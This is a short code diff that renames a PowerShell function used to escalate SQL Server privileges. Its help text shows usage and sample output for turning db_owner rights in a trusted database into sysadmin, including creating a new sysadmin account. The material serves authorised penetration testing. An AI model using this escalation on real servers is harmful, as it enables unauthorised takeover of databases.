@@ -1,4 +1,4 @@
-function Invoke-SqlServerEscalateDbowner
+function Invoke-SqlServer-Escalate-DbOwner
 {
     <#
 	.SYNOPSIS
@@ -12,7 +12,7 @@ function Invoke-SqlServerEscalateDbowner
 	.EXAMPLE
 	   Getting sysadmin as a user that has the db_owner role in a trusted database owned by a sysadmin.
 
-	   PS C:\> Invoke-SqlServerEscalateDbowner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS
+	   PS C:\> Invoke-SqlServer-Escalate-DbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS
 	   [*] Attempting to Connect to SQLServer\SQLEXPRESS as myappuser...
 	   [*] Connected.
 	   [*] Enumerating accessible trusted databases owned by sysadmins...
@@ -26,7 +26,7 @@ function Invoke-SqlServerEscalateDbowner
 	.EXAMPLE
 	   Creating new sysadmin, using a user that has the db_owner role in a trusted database owned by a sysadmin.
 	   
-	   PS C:\> Invoke-SqlServerEscalateDbowner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS -newuser eviladmin -newPass MyPassword!
+	   PS C:\> Invoke-SqlServer-Escalate-DbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS -newuser eviladmin -newPass MyPassword!
 	   [*] Attempting to Connect to SQLServer1\SQLEXPRESS as myappuser...
 	   [*] Connected.
 	   [*] Enumerating accessible trusted databases owned by sysadmins...
@@ -42,7 +42,7 @@ function Invoke-SqlServerEscalateDbowner
 
 	.NOTES
 	   Author: Scott Sutherland - 2014, NetSPI
-	   Version: Invoke-SqlServerEscalateDbowner.psm1 v1.0
+	   Version: Invoke-SqlServer-Escalate-DbOwner.psm1 v1.0
 	   Comments: Should work on SQL Server 2005 and Above.
     #>
 
